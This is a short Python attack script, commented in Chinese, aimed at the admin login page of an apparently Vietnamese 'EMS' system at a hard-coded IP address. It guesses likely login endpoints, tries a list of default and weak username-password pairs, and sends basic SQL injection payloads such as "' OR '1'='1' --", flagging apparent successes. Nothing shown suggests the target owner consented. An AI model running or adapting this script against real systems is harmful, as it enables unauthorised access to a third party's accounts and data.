#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
测试登录页面
"""

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("[*] 测试 EMS 登录页面...")

login_url = "http://222.255.250.228/admin"

# 获取登录页面
resp = requests.get(login_url)
print(f"\n[+] 登录页面标题: Đăng nhập hệ thống EMS")
print(f"[+] 登录字段: txtUserName (用户名), txtPass (密码)")

# 测试常见弱密码
weak_creds = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('admin', 'Admin@123'),
    ('administrator', 'admin'),
    ('admin@ems.com.vn', 'admin'),
    ('admin', 'ems@123'),
    ('admin', 'Ems@123'),
    ('admin', 'Password@123')
]

print(f"\n[*] 测试 {len(weak_creds)} 个弱密码组合...")

# 查找登录提交的 URL
# 需要分析 JavaScript 代码
print(f"\n[*] 分析登录逻辑...")

# 获取相关的 JS 文件
js_resp = requests.get("http://222.255.250.228/ContentsAdmin/dist/js/pages/login.js", verify=False)
if js_resp.status_code == 200:
    print("[+] 找到 login.js")
    # 查找 API 端点
    if 'api' in js_resp.text.lower():
        print("[!] 发现 API 调用")

# 尝试找到登录 API
possible_endpoints = [
    '/api/login',
    '/api/auth/login', 
    '/login',
    '/admin/login',
    '/api/account/login',
    '/Account/Login'
]

for endpoint in possible_endpoints:
    test_url = f"http://222.255.250.228{endpoint}"
    try:
        # 测试 POST 请求
        test_resp = requests.post(test_url, json={}, verify=False, timeout=3)
        if test_resp.status_code != 404:
            print(f"\n[!] 发现可能的登录端点: {endpoint} (状态码: {test_resp.status_code})")
            
            # 测试弱密码
            for username, password in weak_creds[:5]:
                data = {
                    'txtUserName': username,
                    'txtPass': password,
                    'username': username,
                    'password': password,
                    'loginEmail': username,
                    'loginPassword': password
                }
                
                login_resp = requests.post(test_url, data=data, json=data, verify=False, timeout=5)
                
                print(f"  测试 {username}:{password} - 状态码: {login_resp.status_code}")
                
                # 检查响应
                if login_resp.status_code == 200:
                    try:
                        result = login_resp.json()
                        if result.get('success') or result.get('token'):
                            print(f"  [!!!] 登录成功: {username}:{password}")
                            print(f"  响应: {result}")
                            break
                    except:
                        # 非 JSON 响应，检查重定向或 cookies
                        if 'dashboard' in login_resp.text.lower() or login_resp.cookies:
                            print(f"  [!!!] 可能登录成功: {username}:{password}")
                            break
    except:
        pass

# 测试 SQL 注入
print(f"\n[*] 测试基础 SQL 注入...")

sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin' --",
    "admin' OR '1'='1' --"
]

for payload in sql_payloads:
    for endpoint in ['/api/login', '/Account/Login']:
        test_url = f"http://222.255.250.228{endpoint}"
        data = {
            'txtUserName': payload,
            'txtPass': 'anything',
            'username': payload,
            'password': 'anything'
        }
        
        try:
            resp = requests.post(test_url, data=data, json=data, verify=False, timeout=3)
            if resp.status_code == 200:
                print(f"\n[!] SQL 注入测试 - {endpoint}")
                print(f"  Payload: {payload}")
                print(f"  响应长度: {len(resp.text)}")
                if 'error' not in resp.text.lower():
                    print(f"  [!] 可能存在 SQL 注入!")
        except:
            pass

print("\n[+] 测试完成")